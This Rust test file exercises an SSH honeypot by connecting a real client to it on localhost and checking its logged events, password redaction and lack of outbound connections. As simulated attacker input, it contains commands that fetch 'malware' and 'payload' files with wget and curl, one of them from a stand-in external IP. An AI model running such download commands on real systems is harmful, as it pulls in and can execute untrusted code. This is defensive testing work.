//! Real-client integration tests (Task 14): connects a russh SSH client to this crate's own
//! SSH honeypot and verifies events, protocol correctness, and the no-outbound-connection
//! guarantee end to end. These tests exercise the full stack: TCP, version exchange, key
//! exchange, encrypted transport, user authentication, channel management, and shell/transfer
//! data flow.

use std::sync::Arc;
use std::time::Duration;

/// Minimal russh client handler that accepts any host key (this is a test against our own
/// honeypot, not a connection to a third party).
struct TestHandler;

impl russh::client::Handler for TestHandler {
    type Error = russh::Error;

    fn check_server_key(
        &mut self,
        _key: &russh::keys::PublicKey,
    ) -> impl std::future::Future<Output = Result<bool, Self::Error>> + Send {
        async { Ok(true) }
    }
}

#[tokio::test]
async fn ssh_handshake_and_session_with_real_client() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let (addr, handle) = sensor_ssh::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir,
        host_key_path,
    )
    .await
    .unwrap();

    // Connect with russh client.
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();

    // Authenticate.
    let auth_result = session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    assert!(
        auth_result.success(),
        "authentication must succeed (accept-all)"
    );

    // Open a channel and request a shell.
    let channel = session.channel_open_session().await.unwrap();
    channel
        .request_pty(false, "xterm", 80, 24, 0, 0, &[])
        .await
        .unwrap();
    channel.request_shell(false).await.unwrap();

    // Give the server time to send the initial prompt.
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Type commands.
    channel.data(&b"uname -a\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel
        .data(&b"wget http://203.0.113.99/malware\n"[..])
        .await
        .unwrap();

    // Give the server time to process and emit events.
    tokio::time::sleep(Duration::from_millis(500)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    // Read and verify events.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();

    let signal_types: Vec<&str> = events.iter().map(|e| e.signal_type.as_str()).collect();
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_CONNECTION),
        "missing honeypot_connection event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT),
        "missing honeypot_login_attempt event; got: {signal_types:?}"
    );
    assert!(
        signal_types
            .iter()
            .any(|s| *s == sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC),
        "missing honeypot_command_exec event; got: {signal_types:?}"
    );

    // Verify protocol_label = "ssh" on all events.
    for event in &events {
        let label = event
            .metadata
            .get("protocol_label")
            .and_then(|v| v.as_str());
        assert_eq!(label, Some("ssh"), "protocol_label must be 'ssh'");
    }

    // Verify protocol = "tcp" on all events.
    for event in &events {
        assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    }

    // Verify authenticated semantics.
    let conn_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_CONNECTION)
        .unwrap();
    assert!(!conn_event.authenticated);
    let login_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT)
        .unwrap();
    assert!(login_event.authenticated);

    // PII discipline: password must not appear in any event.
    let all_json = serde_json::to_string(&events).unwrap();
    assert!(
        !all_json.contains("password123"),
        "password must never appear in events"
    );
}

#[tokio::test]
async fn no_outbound_connections() {
    // Start a "target" server that the fake wget/curl would connect to if it actually made
    // network requests. Verify it receives zero connections.
    let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let target_addr = target_listener.local_addr().unwrap();
    let connection_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let count = connection_count.clone();
    let target_task = tokio::spawn(async move {
        loop {
            if let Ok((_stream, _addr)) = target_listener.accept().await {
                count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            }
        }
    });

    let dir = tempfile::tempdir().unwrap();
    let spool_dir = dir.path().join("spool");
    let (addr, handle) = sensor_ssh::start_test_server(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        spool_dir,
        dir.path().join("host_key"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session.authenticate_password("root", "pass").await.unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    let cmd = format!("wget http://127.0.0.1:{}/malware.bin\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();
    let cmd = format!("curl http://127.0.0.1:{}/payload\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();

    tokio::time::sleep(Duration::from_secs(1)).await;
    drop(channel);
    drop(session);
    handle.abort();
    target_task.abort();

    assert_eq!(
        connection_count.load(std::sync::atomic::Ordering::Relaxed),
        0,
        "sensor must open ZERO outbound connections"
    );
}
